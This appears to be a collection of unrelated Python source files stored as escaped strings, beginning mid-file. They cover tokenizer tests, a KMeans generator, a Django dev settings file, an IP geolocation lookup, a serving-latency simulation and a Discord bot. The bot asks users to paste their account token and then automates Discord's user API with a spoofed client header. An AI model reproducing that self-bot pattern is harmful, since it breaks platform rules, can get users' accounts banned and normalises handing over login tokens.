capture_output= True)\n    with open(hostfilepath, 'w') as file:\n        file.write(newdata)\nexcept Exception as e:\n    print(e)\n    getpass.getpass(\"\")\n    exit(1)\n\nprint(\"Unblocked sites!\")\nsubprocess.run(\"attrib +r {}\".format(hostfilepath), shell= True, capture_output= True)\ngetpass.getpass(\"\")",
    "import numpy as np\nimport os\nimport random\nfrom utils.plot import *\n\n\nclass KMeans_dataset:\n    def __init__(self, args):\n        self.args = args\n        self.random_dataset = args['random']\n        self.data = None\n        self.label = None # no use (kmeans is unsupervised learning)\n\n    def get_dataset(self) -> np.ndarray:\n        if self.random_dataset: self.generate_random_data()\n        return self.data\n\n    def read_data(self):\n        pass\n\n    def generate_random_data(self, show: bool = True):\n        \"\"\" generate _dataset by config file\n        \"\"\"\n        kernel = self.args['kernel']\n        size = self.args['size']\n        data_value_min = self.args['range']['min']\n        data_value_max = self.args['range']['max']\n        radius = self.args['radius']\n\n        data = [[] for _ in range(kernel)]\n        for i in range(kernel):\n            # random kernel x,y\n            cur_kernel_pos_x = random.uniform(data_value_min, data_value_max)\n            cur_kernel_pos_y = random.uniform(data_value_min, data_value_max)\n            # generate random data with random kernel\n            for _ in range(size):\n                x = random.uniform(-radius, radius)\n                y = random.uniform(-radius, radius)\n                data[i].append([x+cur_kernel_pos_x, y+cur_kernel_pos_y])\n        data = np.array(data, dtype=np.float32)\n        if show: draw_clusters(data, kernel)\n        shape = data.shape\n        self.data = data.reshape(shape[0] * shape[1], shape[2])\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom __future__ import annotations\n\nimport json\nimport os\nimport resource\nimport sys\nfrom typing import Optional\n\nimport psutil\nimport pytest\nimport tiktoken\n\nfrom .adapters import get_tokenizer\nfrom .common import FIXTURES_PATH, gpt2_bytes_to_unicode\n\nVOCAB_PATH = FIXTURES_PATH / \"gpt2_vocab.json\"\nMERGES_PATH = FIXTURES_PATH / \"gpt2_merges.txt\"\n\n\ndef memory_limit(max_mem):\n    def decorator(f):\n        def wrapper(*args, **kwargs):\n            process = psutil.Process(os.getpid())\n            prev_limits = resource.getrlimit(resource.RLIMIT_AS)\n            resource.setrlimit(\n                resource.RLIMIT_AS, (process.memory_info().rss + max_mem, -1)\n            )\n            try:\n                result = f(*args, **kwargs)\n                return result\n            finally:\n                # Even if the function above fails (e.g., it exceeds the\n                # memory limit), reset the memory limit back to the\n                # previous limit so other tests aren't affected.\n                resource.setrlimit(resource.RLIMIT_AS, prev_limits)\n\n        return wrapper\n\n    return decorator\n\n\ndef get_tokenizer_from_vocab_merges_path(\n    vocab_path: str | os.PathLike,\n    merges_path: str | os.PathLike,\n    special_tokens: Optional[list[str]] = None,\n):\n    gpt2_byte_decoder = {v: k for k, v in gpt2_bytes_to_unicode().items()}\n    with open(vocab_path) as vocab_f:\n        gpt2_vocab = json.load(vocab_f)\n    gpt2_bpe_merges = []\n    with open(merges_path) as f:\n        for line in f:\n            cleaned_line = line.rstrip()\n            if cleaned_line and len(cleaned_line.split(\" \")) == 2:\n                gpt2_bpe_merges.append(tuple(cleaned_line.split(\" \")))\n    # The GPT-2 tokenizer uses a remapped unicode encoding for bytes. Let's\n    # just return the original bytes, so we don't force students to use\n    # any particular encoding scheme.\n    vocab = {\n        gpt2_vocab_index: bytes([gpt2_byte_decoder[token] for token in gpt2_vocab_item])\n        for gpt2_vocab_item, gpt2_vocab_index in gpt2_vocab.items()\n    }\n    # If any of the special tokens don't exist in the vocab, append them to the vocab.\n    if special_tokens:\n        for special_token in special_tokens:\n            byte_encoded_special_token = special_token.encode(\"utf-8\")\n            if byte_encoded_special_token not in set(vocab.values()):\n                vocab[len(vocab)] = byte_encoded_special_token\n\n    merges = [\n        (\n            bytes([gpt2_byte_decoder[token] for token in merge_token_1]),\n            bytes([gpt2_byte_decoder[token] for token in merge_token_2]),\n        )\n        for merge_token_1, merge_token_2 in gpt2_bpe_merges\n    ]\n    return get_tokenizer(vocab, merges, special_tokens)\n\n\ndef test_roundtrip_empty():\n    tokenizer = get_tokenizer_from_vocab_merges_path(\n        vocab_path=VOCAB_PATH,\n        merges_path=MERGES_PATH,\n    )\n    test_string = \"\"\n    encoded_ids = tokenizer.encode(test_string)\n    decoded_string = tokenizer.decode(encoded_ids)\n    assert test_string == decoded_string\n\n\ndef test_empty_matches_tiktoken():\n    reference_tokenizer = tiktoken.get_encoding(\"gpt2\")\n    tokenizer = get_tokenizer_from_vocab_merges_path(\n        vocab_path=VOCAB_PATH,\n        merges_path=MERGES_PATH,\n    )\n    test_string = \"\"\n\n    reference_ids = reference_tokenizer.encode(test_string)\n    ids = tokenizer.encode(test_string)\n    assert ids == reference_ids\n\n    tokenized_string = [tokenizer.decode([x]) for x in ids]\n    assert tokenized_string == []\n\n    assert tokenizer.decode(ids) == test_string\n    assert reference_tokenizer.decode(reference_ids) == test_string\n\n\ndef test_roundtrip_single_character():\n    tokenizer = get_tokenizer_from_vocab_merges_path(\n        vocab_path=VOCAB_PATH,\n        merges_path=MERGES_PATH,\n    )\n    test_string = \"s\"\n    encoded_ids = tokenizer.encode(test_string)\n    decoded_string = tokenizer.decode(encoded_ids)\n    assert test_string == decoded_string\n\n\ndef test_single_character_matches_tiktoken():\n    reference_tokenizer = tiktoken.get_encoding(\"gpt2\")\n    tokenizer = get_tokenizer_from_vocab_merges_path(\n        vocab_path=VOCAB_PATH,\n        merges_path=MERGES_PATH,\n    )\n    test_string = \"s\"\n\n    reference_ids = reference_tokenizer.encode(test_string)\n    ids = tokenizer.encode(test_string)\n    assert ids == reference_ids\n\n    tokenized_string = [tokenizer.decode([x]) for x in ids]\n    assert tokenized_string == [\"s\"]\n\n    assert tokenizer.decode(ids) == test_string\n    assert reference_tokenizer.decode(reference_ids) == test_string\n\n\ndef test_roundtrip_single_unicode_character():\n    tokenizer = get_tokenizer_from_vocab_merges_path(\n        vocab_path=VOCAB_PATH,\n        merges_path=MERGES_PATH,\n    )\n    test_string = \"\ud83d\ude43\"\n    encoded_ids = tokenizer.encode(test_string)\n    decoded_string = tokenizer.decode(encoded_ids)\n    assert test_string == decoded_string\n\n\ndef test_single_unicode_character_matches_tiktoken():\n    reference_tokenizer ",
    "from selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import Select, WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom time import sleep\r\nimport colorama\r\nfrom colorama import Fore, Style\r\nfrom selenium.webdriver.remote.remote_connection import LOGGER\r\nimport logging\r\n\r\n\r\nLOGGER.setLevel(logging.ERROR)\r\n# Initialize Chrome options\r\nchrome_options = webdriver.ChromeOptions()\r\nchrome_options.add_argument('--headless')\r\nchrome_options.headless = True\r\n\r\n# Initialize WebDriver with Chrome options\r\ndriver = webdriver.Chrome(options=chrome_options)\r\nwebsite = \"https://ttsmp3.com/text-to-speech/British2English/\"\r\ndriver.get(website)\r\n\r\n# Set implicit wait for the driver\r\ndriver.implicitly_wait(10)\r\n\r\n# Wait for the dropdown to be clickable\r\nselect_element = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, 'sprachwahl')))\r\n\r\n# Select 'British English / Brian' from the dropdown\r\nButtonselection = Select(select_element)\r\nButtonselection.select_by_visible_text(\"British English / Brian\")\r\n\r\ndef speak(text):\r\n    length_of_text = len(str(text))\r\n    if length_of_text == 0:\r\n        pass\r\n    else:\r\n        colorama.init(autoreset=True)\r\n        print(Fore.LIGHTBLUE_EX + Style.BRIGHT + f\"J.A.R.V.I.S : {text}\")\r\n        driver.find_element(By.ID, \"voicetext\").clear()  # Clear text field\r\n        driver.find_element(By.ID, \"voicetext\").send_keys(text)\r\n        driver.find_element(By.ID, \"vorlesenbutton\").click()  # Corrected value attribute\r\n        sleep_time = max(2, (length_of_text // 30) * 4+4)  # Calculate sleep time based on text length\r\n        sleep(sleep_time)\r\n",
    "import os\nimport sys\nimport numpy as np\nimport pandas as pd\nfrom pandas import DataFrame\nfrom ner.entity.artifact_entity import (\n    DataIngestionArtifacts,\n    DataTransformationArtifacts,\n)\nfrom ner.configuration.gcloud import GCloud\nfrom ner.constants import *\nfrom ner.entity.config_entity import DataTransformationConfig\nfrom ner.exception import NerException\nfrom ner.logger import logging\nfrom ner.utils.utils import MainUtils\n\n\nclass DataTransformation:\n    def __init__(\n        self,\n        data_transformation_config: DataTransformationConfig,\n        data_ingestion_artifacts: DataIngestionArtifacts,\n    ) -> None:\n        self.data_transformation_config = data_transformation_config\n        self.data_ingestion_artifacts = data_ingestion_artifacts\n        self.utils = MainUtils()\n        self.gcloud = GCloud()\n\n    def splitting_data(self, df: DataFrame) -> dict:\n        logging.info(\"Entered the splitting_data method of Data transformation class\")\n        try:\n            # Taking subset of data for training\n            df = df[0:1000]\n\n            labels = [i.split() for i in df[\"labels\"].values.tolist()]\n            unique_labels = set()\n\n            for lb in labels:\n                [unique_labels.add(i) for i in lb if i not in unique_labels]\n\n            labels_to_ids = {k: v for v, k in enumerate(unique_labels)}\n            ids_to_labels = {v: k for v, k in enumerate(unique_labels)}\n\n            df_train, df_val, df_test = np.split(\n                df.sample(frac=1, random_state=42),\n                [int(0.8 * len(df)), int(0.9 * len(df))],\n            )\n\n            logging.info(\n                \"Exited the splitting_data method of Data transformation class\"\n            )\n            return (\n                labels_to_ids,\n                ids_to_labels,\n                df_train,\n                df_val,\n                df_test,\n                unique_labels,\n            )\n\n        except Exception as e:\n            raise NerException(e, sys) from e\n\n    def initiate_data_transformation(self) -> DataTransformationArtifacts:\n        logging.info(\n            \"Entered the initiate_data_transformation method of Data transformation class\"\n        )\n        try:\n            # Creating Data transformation artifacts directory\n            os.makedirs(\n                self.data_transformation_config.data_transformation_artifacts_dir,\n                exist_ok=True,\n            )\n            logging.info(\n                f\"Created {os.path.basename(self.data_transformation_config.data_transformation_artifacts_dir)} directory.\"\n            )\n\n            df = pd.read_csv(self.data_ingestion_artifacts.csv_data_file_path)\n            (\n                labels_to_ids,\n                ids_to_labels,\n                df_train,\n                df_val,\n                df_test,\n                unique_labels,\n            ) = self.splitting_data(df=df)\n            logging.info(\"Splitted the data\")\n\n            self.utils.dump_pickle_file(\n                output_filepath=self.data_transformation_config.labels_to_ids_path,\n                data=labels_to_ids,\n            )\n            logging.info(\n                f\"Saved the labels to ids pickle file to Artifacts directory. File name - {os.path.basename(self.data_transformation_config.labels_to_ids_path)}\"\n            )\n\n            self.utils.dump_pickle_file(\n                output_filepath=self.data_transformation_config.ids_to_labels_path,\n                data=ids_to_labels,\n            )\n            logging.info(\n                f\"Saved the ids to labels pickle file to Artifacts directory. File name - {os.path.basename(self.data_transformation_config.ids_to_labels_path)}\"\n            )\n\n            self.gcloud.sync_folder_to_gcloud(\n                gcp_bucket_url=BUCKET_NAME,\n                filepath=self.data_transformation_config.ids_to_labels_gcp_path,\n                filename=IDS_TO_LABELS_FILE_NAME,\n            )\n            logging.info(\n                f\"Uploaded the ids to labels pickle file to Google cloud storage. File name - {os.path.basename(self.data_transformation_config.ids_to_labels_path)}\"\n            )\n\n            self.utils.dump_pickle_file(\n                output_filepath=self.data_transformation_config.df_train_path,\n                data=df_train,\n            )\n            logging.info(\n                f\"Saved the train df pickle file to Artifacts directory. File name - {os.path.basename(self.data_transformation_config.df_train_path)}\"\n            )\n\n            self.utils.dump_pickle_file(\n                output_filepath=self.data_transformation_config.df_val_path, data=df_val\n            )\n            logging.info(\n                f\"Saved the val df pickle file to Artifacts directory. File name - {os.path.basename(self.data_transformation_config.df_val_path)}\"\n            )\n\n            self.utils.dump_pickle_file(\n                output_filepath=self.data_transformation_config.df_test_path,\n                data=df_test,\n            )\n        ",
    "import requests\n\ndef find_loc():\n    try:\n        # use the request module to get the public IP address of the machine using the ipify API\n        ipadd = requests.get(\"https://api.ipify.org\").text\n        # Construct the url for obtaining geographical information based on the IP address using the geojs.io API\n        url = \"https://get.geojs.io/v1/ip/geo/\" + ipadd + \".json\"\n\n        # use 'requests' to send a GET request to the geojs.io API and get the geographic information in JSON format\n        geo = requests.get(url)\n        geo.raise_for_status()  # Raise an exception for HTTP errors\n\n        geo_data = geo.json()\n\n        print(geo_data)  # print the obtained geographic in JSON format\n\n        # Extract relevant information from the JSON response\n        city = geo_data[\"city\"]\n        country = geo_data[\"country\"]\n        # state = geo_data[\"state\"]\n        latitude = geo_data[\"latitude\"]\n        longitude = geo_data[\"longitude\"]\n        timezone = geo_data[\"timezone\"]\n        internet = geo_data[\"organization\"]\n\n        # print the extracted information in a formatted manner\n        print(\n            f\"city = {city}\\ncountry = {country}\\n\\nlatitude = {latitude}\\nlongitude = {longitude}\\ntimezone = {timezone}\\ninternet = {internet}\"\n        )\n\n        return f\"city = {city}\\ncountry = {country}\\n\\nlatitude = {latitude}\\nlongitude = {longitude}\\ntimezone = {timezone}\\ninternet = {internet}\"\n\n    except requests.RequestException as e:\n        print(\"Error occurred during HTTP request:\", e)\n        return \"Error occurred during HTTP request. Please try again.\"\n    except KeyError as e:\n        print(\"KeyError occurred while parsing JSON response:\", e)\n        return \"Error occurred while parsing JSON response. Please try again.\"\n\nfind_loc()\n",
    "\"\"\"\nDjango settings for example_project project.\n\nGenerated by 'django-admin startproject' using Django 5.0.2.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.0/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = \"dmhtw$9o2b6p2wa08okj@&zp$8wb-_1mtman318_u$baq^cx^w\"\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = [\"localhost\", \"127.0.0.1\"]\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    \"django.contrib.auth\",\n    \"django.contrib.contenttypes\",\n    \"django.contrib.sessions\",\n    \"django.contrib.messages\",\n    \"django.contrib.staticfiles\",\n    \"django_admin_contexts\",\n    \"django.contrib.admin\",\n    \"django.contrib.sites\",\n    \"django.contrib.flatpages\",\n    \"django.contrib.redirects\",\n    \"debug_toolbar\",\n    \"django_extensions\",\n    \"taggit\",\n    \"waffle\",\n    \"guardian\",\n    \"organizations\",\n    \"account\",\n    \"pinax.invitations\",\n    \"pinax.teams\",\n    \"helpdesk\",\n    \"payments\",\n    \"actstream\",\n    \"easy_thumbnails\",\n    \"ecommerce\",\n]\n\nMIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n    \"debug_toolbar.middleware.DebugToolbarMiddleware\",\n    \"waffle.middleware.WaffleMiddleware\",\n]\n\nROOT_URLCONF = \"example_project.urls\"\n\nTEMPLATES = [\n    {\n        \"BACKEND\": \"django.template.backends.django.DjangoTemplates\",\n        \"DIRS\": [BASE_DIR / \"templates\"],\n        \"APP_DIRS\": True,\n        \"OPTIONS\": {\n            \"context_processors\": [\n                \"django.template.context_processors.debug\",\n                \"django.template.context_processors.request\",\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = \"example_project.wsgi.application\"\n\n\n# Database\n# https://docs.djangoproject.com/en/5.0/ref/settings/#databases\n\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": \"django.db.backends.sqlite3\",\n        \"NAME\": BASE_DIR / \"db.sqlite3\",\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.UserAttributeSimilarityValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.MinimumLengthValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.CommonPasswordValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.NumericPasswordValidator\",\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.0/topics/i18n/\n\nLANGUAGE_CODE = \"en-us\"\n\nTIME_ZONE = \"UTC\"\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.0/howto/static-files/\n\nSTATIC_URL = \"static/\"\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = \"django.db.models.BigAutoField\"\n\nINTERNAL_IPS = [\n    \"127.0.0.1\",\n]\n",
    "# Copyright 2024 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\n\nCUTOFF_INPUT = 1024\nCUTOFF_OUTPUT = 1024\n\n# batch size 60, ful cache, bfloat\nprefill_bucket_size_to_s = {64: 0.007696230011060834, 128: 0.011508351005613805, 256: 0.01721684739459306, 512: 0.03257157760672271, 1024: 0.08185497261583805}\n\n# batch size 96, ful cache, quantized\nprefill_bucket_size_to_s = {64: 0.006911616190336645, 128: 0.011646182998083532, 256: 0.01875854718964547, 512: 0.0334438294172287, 1024: 0.0643601292045787}\n\n# batch size 96, rolling, bfloat\nprefill_bucket_size_to_s = {64: 0.007730783987790346, 128: 0.011515899002552033, 256: 0.01780580161139369, 512: 0.03115477201063186, 1024: 0.07443338260054588}\n\n# batch size 160, rolling, quantized \nprefill_bucket_size_to_s = {64: 0.006821704190224409, 128: 0.01175499300006777, 256: 0.018776051187887787, 512: 0.03392685519065708, 1024: 0.06476318498607725}\n\nprefill_bucket_size_to_ms = {k: p*1000 for k, p in prefill_bucket_size_to_s.items() }\n\n# batch size 60, ful cache, bfloat\nsystem_time_per_decode_token_ms =26.55/60\n\n# batch size 96, ful cache, quantized\nsystem_time_per_decode_token_ms =26.0/96\n\n# batch size 96, rolling, bfloat\nsystem_time_per_decode_token_ms =28.18/96\n\n# batch size 160, rolling, quantized \nsystem_time_per_decode_token_ms =30/160\n\ndef do_simulation(prefill_bucket_size_to_ms, system_time_per_decode_token_ms):\n\n    def next_power_of_2(x):  \n        return 1 if x == 0 else 2**(x - 1).bit_length()\n\n    def tokens_in_input_str(s):\n        return_val =  int(1.3 * len(s.split()))\n        #print(f\"{s=} -> {return_val=}\")\n        return return_val\n\n    convo_numbers = []\n    # Please update with your own data file path\n    loaded_share_gpt = json.load(open('~/data/ShareGPT_V3_unfiltered_cleaned_split.json', 'r'))\n    for example in loaded_share_gpt:\n        if len(example['conversations']) < 2:\n            continue\n        input_tokens = tokens_in_input_str(example['conversations'][0]['value'])\n        output_tokens = tokens_in_input_str(example['conversations'][1]['value'])\n        convo_numbers.append( (input_tokens, output_tokens))\n\n    num_convos = len(convo_numbers)\n    kept_convos = [c for c in convo_numbers if c[0] <= CUTOFF_INPUT and c[1] <= CUTOFF_OUTPUT]\n\n    mean_input = sum([c[0] for c in kept_convos]) / len(kept_convos)\n    mean_output = sum([c[1] for c in kept_convos]) / len(kept_convos)\n\n    print(f\"Total {num_convos=} but only kept {kept_convos=}. Out of kept, {mean_input=}, {mean_output=}\")\n\n    total_prefill_system_ms = 0\n    total_generate_system_ms = 0\n\n    total_system_output_tokens = 0\n    for convo in kept_convos:\n        input_tok, output_tok = convo\n        bucket = max(128,next_power_of_2(input_tok))\n        generate_system_ms = output_tok * system_time_per_decode_token_ms \n        prefill_system_ms = prefill_bucket_size_to_ms[bucket]\n\n        print(f\"{convo=} {bucket=}, {prefill_system_ms=:.2f}, {generate_system_ms=:.2f}\")\n\n        total_prefill_system_ms += prefill_system_ms\n        total_generate_system_ms += generate_system_ms\n\n    total_time_ms = total_prefill_system_ms + total_generate_system_ms\n    input_tokens = sum([c[0] for c in kept_convos])\n\n    output_tokens = sum([c[1] for c in kept_convos])\n    print(f\"Output tokens {output_tokens} in {total_time_ms/1000:.2f} seconds, for {output_tokens/(total_time_ms/1000):.2f} out tok/s\")\n\n    total_prefill_sec = total_prefill_system_ms/1000\n    total_generate_sec = total_generate_system_ms/1000\n\n    print(f\"Total time {total_time_ms/1000:.2f} seconds, split {total_prefill_sec=:.2f} seconds and {total_generate_sec=:.2f} seconds\")\n\n    idealized_prefill_sec = 1.1 * input_tokens/1024 * prefill_bucket_size_to_ms[1024] / 1000\n\n    prefill_savings_sec = total_prefill_sec-idealized_prefill_sec\n\n\n    idealized_generate_sec = total_generate_sec/2 # (Roughly save 75% on KV cache high cost on the rest)\n    generate_savings_sec = total_generate_sec - idealized_generate_sec\n\n    print(f\"we think prefill will take {total_prefill_sec=:.2f}, we could get it to {idealized_prefill_sec=:.2f} so we'd save {prefill_savings_sec=:.2f} seconds \")\n    print(f\"with sparsity we could go from  {total_generate_sec=:.2f}, we could get it to {idealized_generate_sec=:.2f} so we'd save {generate_savings_sec=:.2f} seconds \")\n\n    idealized_overall_time = idealized_generate_sec + idealized_prefill_sec\n\n    print(f\"Idealized out tokens {output_tokens} in {idealized_overall_time:.2f} seconds, for {output_tokens/idealized_",
    "import requests\nimport time\nimport sys\nimport base64\nimport json\nfrom colorama import Fore, Style\n\nAPI_URL = \"https://discord.com/api/v9\"\n\nclass LootboxBot:\n    LOOTBOX_ITEMS = {\n        \"1214340999644446723\": \"\ud83d\udc62 Speed Boost\",\n        \"1214340999644446724\": '\ud83e\ude88 \u2192\u2191\u2193\u2192\u2191\u2193',\n        \"1214340999644446722\": '\ud83d\udc22 Wump Shell',\n        \"1214340999644446728\": '\ud83d\udd28 Dream Hammer',\n        \"1214340999644446725\": '\u26d1\ufe0f Power Helmet',\n        \"1214340999644446726\": '\ud83e\udd86 Quack!!',\n        \"1214340999644446721\": '\ud83e\uddf8 Cute Plushie',\n        \"1214340999644446727\": '\ud83c\udf4c OHHHHH BANANA',\n        \"1214340999644446720\": '\ud83d\udde1\ufe0f Buster Blade',\n    }\n\n    unlocked_items = []\n\n    def __init__(self, token):\n        self.headers = get_headers(token)\n\n    def open_lootbox(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/open\", headers=self.headers)\n\n        data = response.json()\n\n        if data[\"opened_item\"] not in self.unlocked_items:\n            print(f\"{Fore.GREEN}[\ud83c\udf81] Unlocked a NEW lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n            self.unlocked_items.append(data[\"opened_item\"])\n        else:\n            print(f\"{Fore.RED}[\ud83c\udf81] Found an old lootbox item: {Fore.MAGENTA}{self.LOOTBOX_ITEMS[data['opened_item']]}{Style.RESET_ALL}\")\n\n        time.sleep(5)\n\n    def redeem_prize(self):\n        response = requests.post(f\"{API_URL}/users/@me/lootboxes/redeem-prize\", headers=self.headers)\n        if response.json()[\"redeemed_prize\"]:\n            print(f'[\ud83e\udd21] Automatically redeemed reward: \"I\\'m a Clown\" Avatar Decoration')\n\n    def log_stats(self, items):\n        print(f\"\\n{Fore.CYAN}[\ud83d\udcc8] Statistics{Style.RESET_ALL}\")\n\n        for key, value in items.items():\n            lootbox_item = self.LOOTBOX_ITEMS[key]\n            print(f\"{Style.BRIGHT}{lootbox_item}{Style.RESET_ALL}: {value} found\")\n\n        total = sum(list(items.values()))\n        print(f\"{Style.BRIGHT}Total{Style.RESET_ALL}: {total} items found\\n\")\n\n    def run(self):\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        for item in data['opened_items']:\n            self.unlocked_items.append(item)\n\n        while not len(self.unlocked_items) >= len(self.LOOTBOX_ITEMS):\n            self.open_lootbox()\n\n        print(f\"\\n{Fore.YELLOW}[\ud83c\udf89] You have unlocked all 9 available items and won the final prize!{Style.RESET_ALL}\")\n\n        response = requests.get(f\"{API_URL}/users/@me/lootboxes\", headers=self.headers)\n\n        data = response.json()\n\n        if not data[\"redeemed_prize\"]:\n            self.redeem_prize()\n        \n        self.log_stats(data['opened_items'])\n\ndef get_headers(token):\n    x_super_properties = {\n        \"os\": \"Windows\",\n        \"client_build_number\": 280472\n    }\n\n    encoded_properties = base64.b64encode(json.dumps(x_super_properties).encode('utf-8')).decode('utf-8')\n\n    return {\n        \"x-super-properties\": encoded_properties,\n        \"referrer\": \"https://discord.com/channels/@me\",\n        \"authorization\": token,\n    }\n\ndef main():\n    valid_token = False\n\n    while not valid_token:\n\n        token = input(f\"{Fore.GREEN}[\ud83d\udd11] Paste your Discord token: {Style.RESET_ALL}\").strip('\"').strip('\\'')\n\n        response = requests.get(f\"{API_URL}/users/@me\", headers=get_headers(token))\n\n        if response.status_code == 200:\n            valid_token = True\n        elif response.status_code == 401:\n            print(f\"{Fore.RED}[\u26a0\ufe0f] Invalid token! Try again...{Style.RESET_ALL}\")\n\n    print(f\"\\n{Fore.GREEN}[\ud83d\udc64] Logged in as: {Fore.MAGENTA}{response.json()['username']}{Style.RESET_ALL}\\n\")\n    bot = LootboxBot(token)\n    bot.run()\n\nif __name__ == \"__main__\":\n\n    banner = f\"\"\"{Fore.YELLOW}\n  ____  _                       _    _                _   _                  ____        _   \n |  _ \\(_)___  ___ ___  _ __ __| |  | |    ___   ___ | |_| |__   _____  __  | __ )  ___ | |_ \n | | | | / __|/ __/ _ \\| '__/ _` |  | |   / _ \\ / _ \\| __| '_ \\ / _ \\ \\/ /  |  _ \\ / _ \\| __|\n | |_| | \\__ \\ (_| (_) | | | (_| |  | |__| (_) | (_) | |_| |_) | (_) >  <   | |_) | (_) | |_ \n |____/|_|___/\\___\\___/|_|  \\__,_|  |_____\\___/ \\___/ \\__|_.__/ \\___/_/\\_\\  |____/ \\___/ \\__| {Style.RESET_ALL}by scp222thj\n \"\"\"\n\n    print(banner)\n\n    try:\n        main()\n    except KeyboardInterrupt:\n        print(Style.RESET_ALL)\n        sys.exit()\n    except Exception as e:\n        print(f\"{Style.RESET_ALL}\\n{e}\")\n        sys.exit()",
    "import json\nimport os\nfrom dataclasses import dataclass\n\nimport torch\nimport torch.nn as nn\nfrom diffusers import IFPipeline\nfrom transformers import T5EncoderModel, T5Tokenizer\n\nimport threestudio\nfrom threestudio.models.prompt_processors.base import PromptProcessor, hash_prompt\nfrom threestudio.utils.misc import cleanup\nfrom threestudio.utils.typing import *\n\n\n@threestudio.register(\"deep-floyd-prompt-processor\")\nclass DeepFloydPromptProcessor(PromptProcessor):\n    @dataclass\n    class Config(PromptProcessor.Config):\n        pretrained_model_name_or_path: str = \"DeepFloyd/IF-I-XL-v1.0\"\n\n    cfg: Config\n\n    ### these functions are unused, kept for debugging ###\n    def configure_text_encoder(self) -> None:\n        os.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\n        self.text_encoder = T5EncoderModel.from_pretrained(\n            self.cfg.pretrained_model_name_or_path,\n            subfolder=\"text_encoder\",\n            load_in_8bit=True,\n            variant=\"8bit\",\n            device_map=\"auto\",\n        )  # FIXME: behavior of auto device map in multi-GPU training\n        self.pipe = IFPipeline.from_pretrained(\n            self.cfg.pretrained_model_name_or_path,\n            text_encoder=self.text_encoder,  # pass the previously instantiated 8bit text encoder\n            unet=None,\n        )\n\n    def destroy_text_encoder(self) -> None:\n        del self.text_encoder\n        del self.pipe\n        cleanup()\n\n    def get_text_embeddings(\n        self, prompt: Union[str, List[str]], negative_prompt: Union[str, List[str]]\n    ) -> Tuple[Float[Tensor, \"B 77 4096\"], Float[Tensor, \"B 77 4096\"]]:\n        text_embeddings, uncond_text_embeddings = self.pipe.encode_prompt(\n            prompt=prompt, negative_prompt=negative_prompt, device=self.device\n        )\n        return text_embeddings, uncond_text_embeddings\n\n    ###\n\n    @staticmethod\n    def spawn_func(pretrained_model_name_or_path, prompts, cache_dir):\n        max_length = 77\n        tokenizer = T5Tokenizer.from_pretrained(\n            pretrained_model_name_or_path, subfolder=\"tokenizer\"\n        )\n        text_encoder = T5EncoderModel.from_pretrained(\n            pretrained_model_name_or_path,\n            subfolder=\"text_encoder\",\n            torch_dtype=torch.float16,  # suppress warning\n            load_in_8bit=True,\n            variant=\"8bit\",\n            device_map=\"auto\",\n        )\n        with torch.no_grad():\n            text_inputs = tokenizer(\n                prompts,\n                padding=\"max_length\",\n                max_length=max_length,\n                truncation=True,\n                add_special_tokens=True,\n                return_tensors=\"pt\",\n            )\n            text_input_ids = text_inputs.input_ids\n            attention_mask = text_inputs.attention_mask\n            text_embeddings = text_encoder(\n                text_input_ids.to(text_encoder.device),\n                attention_mask=attention_mask.to(text_encoder.device),\n            )\n            text_embeddings = text_embeddings[0]\n\n        for prompt, embedding in zip(prompts, text_embeddings):\n            torch.save(\n                embedding,\n                os.path.join(\n                    cache_dir,\n                    f\"{hash_prompt(pretrained_model_name_or_path, prompt)}.pt\",\n                ),\n            )\n\n        del text_encoder\n",
